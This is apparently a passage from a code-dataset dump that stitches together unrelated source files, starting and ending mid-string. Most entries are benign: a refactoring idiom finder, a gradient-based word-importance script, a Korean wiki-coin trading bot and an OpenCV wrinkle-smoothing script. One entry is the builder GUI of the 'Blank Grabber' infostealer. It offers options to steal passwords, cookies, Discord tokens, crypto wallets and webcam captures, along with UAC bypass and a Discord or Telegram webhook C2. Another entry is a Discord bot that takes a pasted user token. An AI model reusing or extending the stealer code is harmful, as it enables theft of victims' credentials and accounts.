scales = []\n    if self.env.enable_kv_quan",
    "import sys\nimport shutil\n\nfrom pyfactoring import files, inspect, extracting\n\n\ndef main():\n    sys.setrecursionlimit(sys.getrecursionlimit() * 100)\n\n    target = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0430\u0431\u0441\u043e\u043b\u044e\u0442\u043d\u044b\u0439 \u043f\u0443\u0442\u044c \u043a \u043f\u0440\u043e\u0435\u043a\u0442\u0443/\u0444\u0430\u0439\u043b\u0443[.txt | .py]: \")\n\n    if target.endswith(\".py\"):\n        exclude_dirs = None\n        exclude_files = None\n    else:\n        exclude_dirs = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0430\u043f\u043a\u0438 \u0434\u043b\u044f \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f \u0438\u043b\u0438 skip: \")\n        exclude_dirs = None if exclude_dirs.lower() == \"skip\" else exclude_dirs.split()\n\n        exclude_files = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0444\u0430\u0439\u043b\u044b \u0434\u043b\u044f \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f \u0438\u043b\u0438 skip: \")\n        exclude_files = None if exclude_files.lower() == \"skip\" else exclude_files.split()\n\n    print()\n\n    filepaths = files.collect_filepaths(target, exclude_dirs=exclude_dirs, exclude_files=exclude_files)\n    modules = [extracting.extract_ast(filepath) for filepath in filepaths]\n\n    prefix_trees = inspect.make_prefix_trees(modules)\n    prefix_trees = {filepath: tree for filepath, tree in zip(filepaths, prefix_trees)}\n\n    terminal_size = shutil.get_terminal_size()\n    print(\"=\" * terminal_size.columns)\n\n    for filepath, prefix_tree in prefix_trees.items():\n        idioms = extracting.extract_idioms(prefix_tree)\n        if not idioms:\n            continue\n\n        print(f\"IDIOMS    |  {len(idioms)}\")\n        print(f\"FILEPATH  |  {filepath}\")\n\n        for idiom, info in idioms.items():\n            print(\"=\" * terminal_size.columns)\n            print(f\"\\n{info.state.idiom}\\n\")\n            for i in info.primary_ids:\n                inspected_tree = prefix_tree.inspected_trees[i]\n                print(f\"link: {filepath}:{inspected_tree.ast.lineno}:{inspected_tree.ast.col_offset}\")\n                for source in extracting.source_from_inspected_tree(filepath, inspected_tree):\n                    print(source)\n                print()\n\n        print(\"=\" * terminal_size.columns)\n",
    "import requests\nimport time\nimport sys\nimport base64\nimport json\nfrom colorama import Fore, Style\n\nAPI_URL = \"https://discord.com/api/v9\"\n\nclass LootboxBot:\n    LOOTBOX_ITEMS = {\n        \"1214340999644446723\": \"\ud83d\udc62 Speed Boost\",\n        \"1214340999644446724\": '\ud83e\ude88 \u2192\u2191\u2193\u2192\u2191\u2193',\n        \"1214340999644446722\": '\ud83d\udc22 Wump Shell',\n        \"1214340999644446728\": '\ud83d\udd28 Dream Hammer',\n        \"1214340999644446725\": '\u26d1\ufe0f Power Helmet',\n        \"1214340999644446726\": '\ud83e\udd86 Quack!!',\n        \"1214340999644446721\": '\ud83e\uddf8 Cute Plushie',\n        \"1214340999644446727\": '\ud83c\udf4c OHHHHH BANANA',\n        \"1214340999644446720\": '\ud83d\udde1\ufe0f Buster Blade',\n    }\n\n    unlocked_items = []\n\n    def __init__(self, token):\n        self.headers = get_headers(token)\n\n    def open_lootbox(self):\n        response = requests.post(f\"{API_URL}/users/@me/lootboxes/open\", headers=self.headers)\n\n        data = response.json()\n\n        if data[\"opened_item\"] not in self.unlocked_items:\n            print(f\"{Fore.GREEN}[\ud83c\udf81] Unlocked a NEW lootbox item: {Fore.MAGENTA}{self.LOOTBOX_ITEMS[data['opened_item']]}{Style.RESET_ALL}\")\n            self.unlocked_items.append(data[\"opened_item\"])\n        else:\n            print(f\"{Fore.RED}[\ud83c\udf81] Found an old lootbox item: {Fore.MAGENTA}{self.LOOTBOX_ITEMS[data['opened_item']]}{Style.RESET_ALL}\")\n\n        time.sleep(5)\n\n    def redeem_prize(self):\n        response = requests.post(f\"{API_URL}/users/@me/lootboxes/redeem-prize\", headers=self.headers)\n        if response.json()[\"redeemed_prize\"]:\n            print(f'[\ud83e\udd21] Automatically redeemed reward: \"I\\'m a Clown\" Avatar Decoration')\n\n    def log_stats(self, items):\n        print(f\"\\n{Fore.CYAN}[\ud83d\udcc8] Statistics{Style.RESET_ALL}\")\n\n        for key, value in items.items():\n            lootbox_item = self.LOOTBOX_ITEMS[key]\n            print(f\"{Style.BRIGHT}{lootbox_item}{Style.RESET_ALL}: {value} found\")\n\n        total = sum(list(items.values()))\n        print(f\"{Style.BRIGHT}Total{Style.RESET_ALL}: {total} items found\\n\")\n\n    def run(self):\n        response = requests.get(f\"{API_URL}/users/@me/lootboxes\", headers=self.headers)\n\n        data = response.json()\n\n        for item in data['opened_items']:\n            self.unlocked_items.append(item)\n\n        while not len(self.unlocked_items) >= len(self.LOOTBOX_ITEMS):\n            self.open_lootbox()\n\n        print(f\"\\n{Fore.YELLOW}[\ud83c\udf89] You have unlocked all 9 available items and won the final prize!{Style.RESET_ALL}\")\n\n        response = requests.get(f\"{API_URL}/users/@me/lootboxes\", headers=self.headers)\n\n        data = response.json()\n\n        if not data[\"redeemed_prize\"]:\n            self.redeem_prize()\n        \n        self.log_stats(data['opened_items'])\n\ndef get_headers(token):\n    x_super_properties = {\n        \"os\": \"Windows\",\n        \"client_build_number\": 280472\n    }\n\n    encoded_properties = base64.b64encode(json.dumps(x_super_properties).encode('utf-8')).decode('utf-8')\n\n    return {\n        \"x-super-properties\": encoded_properties,\n        \"referrer\": \"https://discord.com/channels/@me\",\n        \"authorization\": token,\n    }\n\ndef main():\n    valid_token = False\n\n    while not valid_token:\n\n        token = input(f\"{Fore.GREEN}[\ud83d\udd11] Paste your Discord token: {Style.RESET_ALL}\").strip('\"').strip('\\'')\n\n        response = requests.get(f\"{API_URL}/users/@me\", headers=get_headers(token))\n\n        if response.status_code == 200:\n            valid_token = True\n        elif response.status_code == 401:\n            print(f\"{Fore.RED}[\u26a0\ufe0f] Invalid token! Try again...{Style.RESET_ALL}\")\n\n    print(f\"\\n{Fore.GREEN}[\ud83d\udc64] Logged in as: {Fore.MAGENTA}{response.json()['username']}{Style.RESET_ALL}\\n\")\n    bot = LootboxBot(token)\n    bot.run()\n\nif __name__ == \"__main__\":\n\n    banner = f\"\"\"{Fore.YELLOW}\n  ____  _                       _    _                _   _                  ____        _   \n |  _ \\(_)___  ___ ___  _ __ __| |  | |    ___   ___ | |_| |__   _____  __  | __ )  ___ | |_ \n | | | | / __|/ __/ _ \\| '__/ _` |  | |   / _ \\ / _ \\| __| '_ \\ / _ \\ \\/ /  |  _ \\ / _ \\| __|\n | |_| | \\__ \\ (_| (_) | | | (_| |  | |__| (_) | (_) | |_| |_) | (_) >  <   | |_) | (_) | |_ \n |____/|_|___/\\___\\___/|_|  \\__,_|  |_____\\___/ \\___/ \\__|_.__/ \\___/_/\\_\\  |____/ \\___/ \\__| {Style.RESET_ALL}by scp222thj\n \"\"\"\n\n    print(banner)\n\n    try:\n        main()\n    except KeyboardInterrupt:\n        print(Style.RESET_ALL)\n        sys.exit()\n    except Exception as e:\n        print(f\"{Style.RESET_ALL}\\n{e}\")\n        sys.exit()",
    "import os\nimport subprocess\nimport sys\nimport json\nimport ctypes\nimport shutil\nimport ast\nimport webbrowser\nimport random\nimport string\n\nimport customtkinter as ctk\nfrom tkinter import messagebox, filedialog\nfrom pkg_resources import parse_version\nfrom socket import create_connection\nfrom tkinter import messagebox\nfrom urllib3 import PoolManager, disable_warnings\ndisable_warnings()\nfrom urllib.parse import quote\nfrom PIL import Image\nfrom io import BytesIO\nfrom threading import Thread\n\nclass Settings:\n\tUpdatesCheck = True\n\tPassword = \"Zerno\"\n\nclass Utility:\n\n\t@staticmethod\n\tdef ToggleConsole(choice: bool) -> None:\n\t\tif choice:\n\t\t\t# Show Console\n\t\t\tctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)\n\t\telse:\n\t\t\t# Hide Console\n\t\t\tctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\n\n\t@staticmethod\n\tdef IsAdmin() -> bool:\n\t\ttry:\n\t\t\treturn ctypes.windll.shell32.IsUserAnAdmin() == 1\n\t\texcept Exception:\n\t\t\treturn False\n\t\t\n\t@staticmethod\n\tdef GetSelfDir() -> str:\n\t\treturn os.path.dirname(__file__)\n\t\n\t@staticmethod\n\tdef CheckInternetConnection() -> bool:\n\t\ttry:\n\t\t\tcreate_connection((\"www.google.com\", 80), timeout= 3.0)\n\t\t\treturn True\n\t\texcept Exception:\n\t\t\treturn False\n\t\n\t@staticmethod\n\tdef CheckForUpdates() -> bool:\n\t\tif Settings.UpdatesCheck:\n\t\t\tprint(\"Checking for updates...\")\n\t\t\thashFilePath = os.path.join(os.path.dirname(__file__), \"Extras\", \"hash\")\n\t\t\tif os.path.isfile(hashFilePath):\n\t\t\t\twith open(hashFilePath, \"r\") as f:\n\t\t\t\t\tcontent = f.read()\n\t\t\t\n\t\t\t\ttry:\n\t\t\t\t\thttp = PoolManager(cert_reqs=\"CERT_NONE\")\n\t\t\t\t\t_hash = json.loads(content)[\"hash\"]\n\t\t\t\t\tnewhash = json.loads(http.request(\"GET\", \"https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash\", timeout= 5).data.decode())[\"hash\"]\n\n\t\t\t\t\tos.system(\"cls\")\n\t\t\t\t\treturn _hash != newhash # New update available\n\t\t\t\texcept Exception:\n\t\t\t\t\tpass\n\t\t\tos.system(\"cls\")\n\t\treturn False\n\t\n\t@staticmethod\n\tdef CheckConfiguration() -> None:\n\t\tconfigFile = os.path.join(os.path.dirname(__file__), \"config.json\")\n\t\tpassword = Settings.Password\n\t\tupdatesCheck = Settings.UpdatesCheck\n\n\t\tif os.path.isfile(configFile):\n\t\t\twith open(configFile, \"r\") as file:\n\t\t\t\tconfig = json.load(file)\n\t\t\t\tpassword = config.get(\"Password\", password)\n\t\t\t\tupdatesCheck = config.get(\"Check for updates\", updatesCheck)\n\t\telse:\n\t\t\tupdatesCheck = not input(\"\u0412\u044b \u0445\u043e\u0442\u0438\u0442\u0435 \u0443\u0437\u043d\u0430\u0432\u0430\u0442\u044c \u043e\u0431 \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f\u0445? [Y (default)/N]: \").lower().startswith(\"n\")\n\t\t\t_password = input(\"Zerno \u0435\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u0435\u0433\u043e \u0438\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0432\u043e\u0439 \u043f\u0430\u0440\u043e\u043b\u044c(default: %r): \" % Settings.Password).strip()\n\t\t\tif _password:\n\t\t\t\tpassword = _password\n\t\t\t\n\t\twith open(configFile, \"w\") as file:\n\t\t\tjson.dump({\n\t\t\t\t\"Password\" : password,\n\t\t\t\t\"Check for updates\" : updatesCheck\n\t\t\t}, file, indent= 4, sort_keys= True)\n\t\t\n\t\tSettings.Password = password\n\t\tSettings.UpdatesCheck = updatesCheck\n\nclass BuilderOptionsFrame(ctk.CTkFrame):\n\n\tdef __init__(self, master) -> None:\n\t\tsuper().__init__(master, fg_color= \"transparent\")\n\n\t\tself.fakeErrorData = [False, (\"\", \"\", 0)] # (Title, Message, Icon)\n\t\tself.pumpLimit = 0 # Bytes\n\n\t\tself.grid_propagate(False)\n\n\t\tself.font = ctk.CTkFont(size= 20)\n\n\t\tself.pingMeVar = ctk.BooleanVar(self)\n\t\tself.vmProtectVar = ctk.BooleanVar(self)\n\t\tself.startupVar = ctk.BooleanVar(self)\n\t\tself.meltVar = ctk.BooleanVar(self)\n\t\tself.fakeErrorVar = ctk.BooleanVar(self)\n\t\tself.blockAvSitesVar = ctk.BooleanVar(self)\n\t\tself.discordInjectionVar = ctk.BooleanVar(self)\n\t\tself.uacBypassVar = ctk.BooleanVar(self)\n\t\tself.pumpStubVar = ctk.BooleanVar(self)\n\n\t\tself.captureWebcamVar = ctk.BooleanVar(self)\n\t\tself.capturePasswordsVar = ctk.BooleanVar(self)\n\t\tself.captureCookiesVar = ctk.BooleanVar(self)\n\t\tself.captureHistoryVar = ctk.BooleanVar(self)\n\t\tself.captureAutofillsVar = ctk.BooleanVar(self)\n\t\tself.captureDiscordTokensVar = ctk.BooleanVar(self)\n\t\tself.captureGamesVar = ctk.BooleanVar(self)\n\t\tself.captureWifiPasswordsVar = ctk.BooleanVar(self)\n\t\tself.captureSystemInfoVar = ctk.BooleanVar(self)\n\t\tself.captureScreenshotVar = ctk.BooleanVar(self)\n\t\tself.captureTelegramVar = ctk.BooleanVar(self)\n\t\tself.captureCommonFilesVar = ctk.BooleanVar(self)\n\t\tself.captureWalletsVar = ctk.BooleanVar(self)\n\t\t\n\t\tself.boundExePath = \"\"\n\t\tself.boundExeRunOnStartup = False\n\t\tself.iconBytes = \"\"\n\n\t\tself.OutputAsExe = True\n\t\tself.ConsoleMode = 0 # 0 = None, 1 = Force, 2 = Debug\n\t\tself.C2Mode = 0 # 0 = Discord, 1 = Telegram\n\n\t\tfor i in range(7): # Set 7 rows\n\t\t\tself.rowconfigure(i, weight= 1)\n\t\t\n\t\tfor i in range(6): # Set 6 columns\n\t\t\tself.columnconfigure(i, weight= 1)\n\n\t\t# Controls\n\n\t\tself.C2EntryControl = ctk.CTkEntry(self, placeholder_text= \"\u0412\u043f\u0438\u0448\u0438\u0442\u0435 \u0432\u0435\u0431\u0445\u0443\u043a\", height= 38, font= self.font, text_color= \"white\")\n\t\tself.C2EntryControl.grid(row= 0, column= 0, sticky= \"ew\", padx= (15, 5), columnspan= 5)\n\n\t\tself.testC2ButtonControl = ctk.CTkButton(self, text= \"\u041f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c \u0432\u0435\u0431 \u0445\u0443\u043a\", height= 38, font= self.font, fg_color= \"#454545\", hover_color= \"#4D4D4D\", text_color_disabled= \"grey\", command= lambda: Thread(target= self.",
    "# Copyright (c) Microsoft Corporation.\n# Licensed under the MIT License.\n\ndef vis_by_grad(model, tokenizer, input_sentence, label):\n    model.eval()\n\n    def map_subwords_to_words(sentence, tokenizer):\n        tokens = tokenizer.tokenize(sentence)\n        mapping = []\n        i = 0\n        for token in tokens:\n            if token[0] == \"\u2581\":\n                mapping.append(i)\n                i += 1\n            else:\n                mapping.append(i - 1)\n\n        return mapping, tokens\n\n    # input_len = len(input_sentence.split())\n\n    mapping, tokens = map_subwords_to_words(input_sentence, tokenizer)\n    words = \"\".join(tokens).replace(\"\u2581\", \" \").split()\n\n    input_len = len(words)\n\n    inputs = tokenizer(input_sentence, return_tensors=\"pt\")\n\n    embeddings = model.get_input_embeddings()(inputs['input_ids'])\n    embeddings.requires_grad_()\n    embeddings.retain_grad()\n\n    labels = tokenizer(label, return_tensors=\"pt\")[\"input_ids\"]\n\n    outputs = model(inputs_embeds=embeddings,\n                    attention_mask=inputs['attention_mask'], labels=labels)\n\n    outputs.loss.backward()\n    # print(outputs.loss.item())\n\n    grads = embeddings.grad\n    # print(grads.shape)\n    import torch\n    word_grads = [torch.zeros_like(grads[0][0])\n                  for _ in range(input_len)]  # \u521d\u59cb\u5316\u6bcf\u4e2a\u5355\u8bcd\u7684\u68af\u5ea6\u5411\u91cf\n\n    # ignore the [EOS] token\n    for idx, grad in enumerate(grads[0][:len(mapping)]):\n        word_grads[mapping[idx]] += grad\n\n    words_importance = [grad.norm().item() for grad in word_grads]\n\n    import numpy as np\n\n    \"\"\" normalize importance by min-max\"\"\"\n    min_importance = np.min(words_importance)\n    max_importance = np.max(words_importance)\n    words_importance = (words_importance - min_importance) / \\\n        (max_importance - min_importance)\n\n    # word_importance_dict = {}\n    # for word, importance in zip(words, word_importance):\n    #     print(f\"The gradient for '{word}' is {grad}\")\n    #     word_importance_dict[word] = importance\n\n    return words, words_importance\n\n\ndef vis_by_delete(model, tokenizer, input_sentence, label):\n    import copy\n\n    words = input_sentence.split()\n\n    encoded_label = tokenizer(label, return_tensors=\"pt\")[\"input_ids\"]\n\n    inputs = tokenizer(input_sentence, return_tensors=\"pt\")\n    outputs = model(**inputs, labels=encoded_label)\n    original_loss = outputs.loss.item()\n\n    word_importance = []\n\n    for i in range(len(words)):\n        new_words = copy.deepcopy(words)\n        del new_words[i]\n        new_sentence = ' '.join(new_words)\n        inputs = tokenizer(new_sentence, return_tensors=\"pt\")\n        outputs = model(**inputs, labels=encoded_label)\n        new_loss = outputs.loss.item()\n\n        importance = abs(new_loss - original_loss)\n        word_importance.append(importance)\n\n    import numpy as np\n\n    \"\"\" normalize importance by min-max\"\"\"\n    min_importance = np.min(word_importance)\n    max_importance = np.max(word_importance)\n    word_importance = (word_importance - min_importance) / \\\n        (max_importance - min_importance)\n\n    word_importance_dict = {}\n    for word, importance in zip(words, word_importance):\n        word_importance_dict[word] = importance\n\n    return word_importance_dict\n\n\ndef save_importance(words, importance):\n    from html import escape\n    import matplotlib.pyplot as plt\n    import matplotlib.colors as colors\n    import numpy as np\n\n    cmap = plt.colormaps['Reds']\n    latex_output = ''\n\n    for i, word in enumerate(words):\n        rgba = cmap(importance[i])\n\n        rgb = ','.join(str(int(rgba[j]*255)) for j in range(3))\n\n        # latex_output += '\\\\colorbox[RGB]{' + rgb + '}{' + word + '\\\\vphantom{fg}}\\\\hspace*{0pt}'\n        latex_output += word + ' '\n\n    return latex_output\n\n\nif __name__ == \"__main__\":\n    from transformers import T5Tokenizer, T5ForConditionalGeneration\n\n    tokenizer = T5Tokenizer.from_pretrained(\n        \"google/flan-t5-large\", device_map=\"auto\")\n    model = T5ForConditionalGeneration.from_pretrained(\n        \"google/flan-t5-large\", device_map=\"auto\")\n    input_sentence = \"As an instrument for entailment evaluation, consider the two sentences and determine if their relationship is 'entailment' or 'not_entailment'. Respond with 'entailment' or 'not_entailment'  and true is true :\"\n    label = 'not_entailment'\n\n    print(\"================by grad================\")\n    words, words_importance = vis_by_grad(\n        model, tokenizer, input_sentence, label)\n    for word, importance in zip(words, words_importance):\n        print(f\"{word:10}: {importance:.4f}\")\n\n    print()\n\n    # print(\"================by delete================\")\n    # word_importance_dict = vis_by_delete(model, tokenizer, input_sentence, label)\n    # for word, importance in word_importance_dict.items():\n    #     print(f\"{word:10}: {importance:.4f}\")\n    # print()\n",
    "import requests\nimport json\nimport time\nfrom datetime import datetime\n\n\ndef delay():\n    time.sleep(0.5)\n\n\nclass AutoCoin:\n    def __init__(self):\n        # \uc785\ub825 \ubc1b\ub294 \uac12\n        self.username = input(\"\ubd80\ub9c8\uc704\ud0a4 \uc544\uc774\ub514 \uc785\ub825: \")\n        self.password = input(\"\ubd80\ub9c8\uc704\ud0a4 \ube44\ubc00\ubc88\ud638 \uc785\ub825: \")\n        self.want_buy_price = input(\"\uc6d0\ud558\ub294 \ub9e4\uc218 \uac00\uaca9 \uc544\ub798\ub85c: \")\n        self.want_sell_price = input(\"\uc6d0\ud558\ub294 \ub9e4\ub3c4 \uac00\uaca9 \uc704\ub85c: \")\n\n        self.access_token = None\n        self.access_refreshToken = None\n\n        self.price = 0\n        self.property = 0  # \ud604\uc7ac \uc7ac\uc0b0\n        self.have_coins = 0  # \ud604\uc7ac \ubcf4\uc720 \ucf54\uc778 \uc218\n\n        # URL list\n        self.urls = {\n            \"bsm_login\": \"https://auth.bssm.kro.kr/api/auth/login\",  # \ubd80\ub9c8\uc704\ud0a4\uc5d0 \uc811\uadfc\ud558\uae30 \uc704\ud55c token \uac00\uc838\uc634\n            \"bsm_auth_token\": \"https://auth.bssm.kro.kr/api/oauth/authorize\",  # bsm token\n            \"buma_auth_token\": \"https://buma.wiki/api/auth/oauth/bsm\",  # buman token\n            \"mine\": \"https://buma.wiki/api/coins/mine\",\n            \"coin_price\": \"https://buma.wiki/api/coins/prices\",  # \ubd80\ub9c8\uc704\ud0a4 \ucf54\uc778 \uac00\uaca9 \ud655\uc778\n            \"buy_coin\": \"https://buma.wiki/api/coins/buy\",  # \ucf54\uc778 \ub9e4\uc218\n            \"sell_coin\": \"https://buma.wiki/api/coins/sell\"  # \ucf54\uc778 \ub9e4\ub3c4\n        }\n\n    def show_user_info(self):  # \uc720\uc800\uac00 \uc785\ub825\ud55c \uc815\ubcf4 \ud655\uc778\ud558\ub294 \ud398\uc774\uc9c0\n        text = f\"\"\"\n        \\n\n        ## \uc785\ub825\ub41c \uc815\ubcf4\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. ## \n\n        \uc720\uc800 \uc774\ub984: {self.username}\n        \uc6d0\ud558\ub294 \ub9e4\uc218 \uac00\uaca9 \uc774\ud558 \uac12: {self.want_buy_price}\n        \uc6d0\ud558\ub294 \ub9e4\ub3c4 \uac00\uaca9 \uc774\uc0c1 \uac12: {self.want_sell_price}\n\n        \"\"\"\n        print(text)\n\n    def main(self):  # \ubd80\ub9c8\uc704\ud0a4 \ub85c\uadf8\uc778 \ud568\uc218\n        try:\n            login_data = {\n                \"id\": str(self.username),\n                \"pw\": str(self.password)\n            }\n            login_response = requests.post(str(self.urls[\"bsm_login\"]), json=login_data)\n\n            if login_response.status_code == 200:\n                login_json_response = login_response.json()\n                self.access_token = login_json_response.get(\"accessToken\")\n                self.access_refreshToken = login_json_response.get(\"refreshToken\")\n\n                # self.show_user_info()\n\n                self.get_token()\n                self.mine()\n                self.get_coin_price()\n\n                if self.price <= int(self.want_buy_price):\n                    self.buy()\n\n                if self.price >= int(self.want_sell_price):\n                    self.sell()\n\n                time.sleep(180)\n\n            else:\n                print(\"\uc720\uc800 \uc815\ubcf4\ub97c \ub2e4\uc2dc \ud655\uc778 \ubc14\ub78d\ub2c8\ub2e4.\")\n                exit()\n\n        except requests.exceptions.RequestException as e:\n            print(\"\uc11c\ubc84\uc5d0 \uc5f0\uacb0\ud560 \uc218 \uc5c6\uc74c.\")\n\n    def get_token(self):  # \ud1a0\ud070 \uac00\uc838\uc624\ub294 \ud568\uc218\n        headers = {\n            'Cookie': f'bsm_auth_refresh_token_v1={self.access_refreshToken}; bsm_auth_token_v1={self.access_token}',\n        }\n\n        data = {\"clientId\": \"22fb2e30\", \"redirectURI\": \"https://buma.wiki/oauth\"}\n        response_auth = requests.post(self.urls[\"bsm_auth_token\"], headers=headers, json=data)\n\n        text = response_auth.text\n        result = text[45:77]\n\n        # token \uc694\uccad\n        headers = {\n            'Cookie': f'bsm_auth_refresh_token_v1={self.access_refreshToken}; bsm_auth_token_v1={self.access_token}',\n            'Authcode': f'{result}',\n        }\n\n        data = {\"clientId\": \"22fb2e30\", \"redirectURI\": \"https://buma.wiki/oauth\"}\n        response_token = requests.post(self.urls[\"buma_auth_token\"], json=data, headers=headers)\n\n        data = response_token.text\n        parsed_data = json.loads(data)\n\n        self.access_token = parsed_data[\"accessToken\"]\n        # print(self.access_token) token \ud655\uc778\n\n    def get_coin_price(self):  # \ucf54\uc778 \uac00\uaca9 \uac00\uc838\uc624\ub294 \ud568\uc218\n        response = requests.get(self.urls[\"coin_price\"])\n\n        if response.status_code == 200:\n            json_data = response.json()\n            self.price = json_data[\"price\"]\n            print(f\"{datetime.now()}  \ucf54\uc778 \uac00\uaca9: {self.price}\")\n        else:\n            print('Failed to retrieve the page. Status code:', response.status_code)\n\n    def mine(self):\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        response = requests.get(self.urls[\"mine\"], headers=headers)\n\n        if response.status_code == 200:\n            json_data = response.json()\n            self.property = json_data[\"money\"]\n            self.have_coins = json_data[\"coin\"]\n        else:\n            print('Failed to retrieve the page. Status code:', response.status_code)\n\n    def buy(self):  # \ub9e4\uc218 \ud568\uc218\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        coin_data = {\n            'coinPrice': self.price,\n            'coinCount': self.property // self.price  # \uc804\uc7ac\uc0b0 // \ud604\uc7ac \uac00\uaca9 = \ud480\ub9e4\uc218\n        }\n\n        coin_response = requests.post(self.urls[\"buy_coin\"], json=coin_data, headers=headers)\n\n        if coin_response.status_code == 200:\n            print(f\"- \ucf54\uc778\uc744 {self.property // self.price}\uc8fc \ub9e4\uc218\ud558\uc600\uc2b5\ub2c8\ub2e4.\\n\")\n\n    def sell(self):  # \ub9e4\ub3c4 \ud568\uc218\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        coin_data = {\n            'coinCount': self.have_coins,\n            'coinPrice': self.price\n      ",
    "import cv2\r\nimport numpy as np\r\n\r\n# \u52a0\u8f7d\u56fe\u50cf\u5e76\u8f6c\u6362\u4e3a\u7070\u5ea6\u56fe\u50cf\r\nimage = cv2.imread('1.webp')\r\ngray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\r\nimage_orignal = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\r\n\r\n# \u52a0\u8f7d\u4eba\u8138\u548c\u773c\u775b\u68c0\u6d4b\u5668\u6a21\u578b\r\nface_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')\r\neye_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_eye.xml')\r\n\r\n# \u68c0\u6d4b\u4eba\u8138\r\nfaces = face_cascade.detectMultiScale(gray, scaleFactor=1.3, minNeighbors=5)\r\n\r\n# \u5982\u679c\u68c0\u6d4b\u5230\u4e86\u4eba\u8138\r\nif len(faces) > 0:\r\n    for (fx, fy, fw, fh) in faces:\r\n        # \u5728\u4eba\u8138\u533a\u57df\u5185\u8fdb\u884c\u76b1\u7eb9\u68c0\u6d4b\r\n        face_roi = gray[fy:fy+int(3*fh/5), fx+int(2*fw/11):fx+int(9*fw/11)]\r\n\r\n        # \u52a0\u8f7d\u773c\u775b\u68c0\u6d4b\u5668\u6a21\u578b\r\n        eyes = eye_cascade.detectMultiScale(face_roi, scaleFactor=1.1, minNeighbors=5)\r\n\r\n        # \u7ed8\u5236\u77e9\u5f62\u6846\u9009\u533a\u57df\u5e76\u83b7\u53d6\u773c\u775b\u548c\u5634\u5df4\u68c0\u6d4b\u533a\u57df\r\n        wrinkle_region = np.ones_like(face_roi) * 255\r\n        for (ex, ey, ew, eh) in eyes:\r\n            # \u7ed8\u5236\u77e9\u5f62\u6846\u9009\u533a\u57df\uff08\u773c\u775b\u4e0a\u65b9\uff09\r\n            cv2.rectangle(wrinkle_region, (ex, ey + int(6 * eh / 9)), (ex + ew, ey - int(3 * eh / 9)), (0, 0, 0), -1)\r\n\r\n        # \u4f7f\u7528Sobel\u7b97\u5b50\u8fdb\u884c\u8fb9\u7f18\u68c0\u6d4b\r\n        sobel_x = cv2.Sobel(face_roi, cv2.CV_64F, 1, 0, ksize=3)\r\n        sobel_y = cv2.Sobel(face_roi, cv2.CV_64F, 0, 1, ksize=3)\r\n        gradient_magnitude = np.sqrt(sobel_x**2 + sobel_y**2)\r\n\r\n        # Sobel\u8fb9\u7f18\u56fe\u50cf\r\n        wrinkle_image = np.uint8(gradient_magnitude > 100) * 255\r\n\r\n        # \u5728\u76b1\u7eb9\u68c0\u6d4b\u533a\u57df\u4e4b\u5916\u540c\u65f6\u8fdb\u884c\u76b1\u7eb9\u68c0\u6d4b\r\n        wrinkle_image = cv2.bitwise_and(wrinkle_image, wrinkle_region)\r\n\r\n        # \u5bfb\u627e\u68c0\u6d4b\u5230\u7684\u76b1\u7eb9\u533a\u57df\u7684\u8f6e\u5ed3\r\n        contours, _ = cv2.findContours(wrinkle_image, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\r\n\r\n        # \u5728\u539f\u56fe\u4e0a\u7ed8\u5236\u68c0\u6d4b\u5230\u7684\u76b1\u7eb9\u533a\u57df\r\n        for contour in contours:\r\n            x, y, w, h = cv2.boundingRect(contour)\r\n            #cv2.rectangle(face_roi, (x, y), (x + w, y + h), (0, 255, 0), 2)\r\n            # \u5bf9\u76b1\u7eb9\u533a\u57df\u8fdb\u884c\u9ad8\u65af\u6ee4\u6ce2\r\n            face_roi[y:y+h, x:x+w] = cv2.GaussianBlur(face_roi[y:y+h, x:x+w], (21, 21), 0)\r\n        # \u5c06\u5904\u7406\u540e\u7684\u4eba\u8138\u533a\u57df\u653e\u56de\u539f\u56fe\u4e2d\r\n        gray[fy:fy+int(3*fh/5), fx+int(2*fw/11):fx+int(9*fw/11)] = face_roi\r\nelse:\r\n    # \u5982\u679c\u672a\u68c0\u6d4b\u5230\u4eba\u8138\uff0c\u5219\u5728\u6574\u4e2a\u56fe\u50cf\u533a\u57df\u8fdb\u884c\u76b1\u7eb9\u68c0\u6d4b\r\n    # \u7ed8\u5236\u77e9\u5f62\u6846\u9009\u533a\u57df\u5e76\u83b7\u53d6\u773c\u775b\u68c0\u6d4b\u533a\u57df\r\n    wrinkle_region = np.ones_like(gray) * 255\r\n    eyes = eye_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5)\r\n    for (ex, ey, ew, eh) in eyes:\r\n        # \u7ed8\u5236\u77e9\u5f62\u6846\u9009\u533a\u57df\uff08\u773c\u775b\u4e0a\u65b9\uff09\r\n        cv2.rectangle(wrinkle_region, (ex, ey + int(6 * eh / 9)), (ex + ew, ey - int(3 * eh / 9)), (0, 0, 0), -1)\r\n\r\n    # \u4f7f\u7528Sobel\u7b97\u5b50\u8fdb\u884c\u8fb9\u7f18\u68c0\u6d4b\r\n    sobel_x = cv2.Sobel(gray, cv2.CV_64F, 1, 0, ksize=3)\r\n    sobel_y = cv2.Sobel(gray, cv2.CV_64F, 0, 1, ksize=3)\r\n    gradient_magnitude = np.sqrt(sobel_x**2 + sobel_y**2)\r\n\r\n    # 